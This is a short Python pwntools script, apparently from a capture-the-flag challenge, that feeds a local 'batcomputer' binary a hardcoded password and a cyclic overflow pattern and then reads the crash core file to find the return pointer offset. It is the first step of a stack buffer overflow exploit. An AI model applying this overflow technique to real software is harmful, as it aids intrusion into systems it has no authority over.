#!/usr/bin/env python3

from pwn import *

elf = ELF("./batcomputer", checksec=False)

p = process("./batcomputer")
p.sendlineafter(b"> ", b"2")
p.sendlineafter(b"Ok. Let's do this. Enter the password:", b"b4tp@$$w0rd!")
p.sendlineafter(b"Enter the navigation commands:", cyclic(137, n=8))
p.sendlineafter(b"> ", b"3")
p.wait()

core = p.corefile
offset = cyclic_find(core.read(core.rsp, 8), n=8)
info(f"Return pointer offset: {offset}")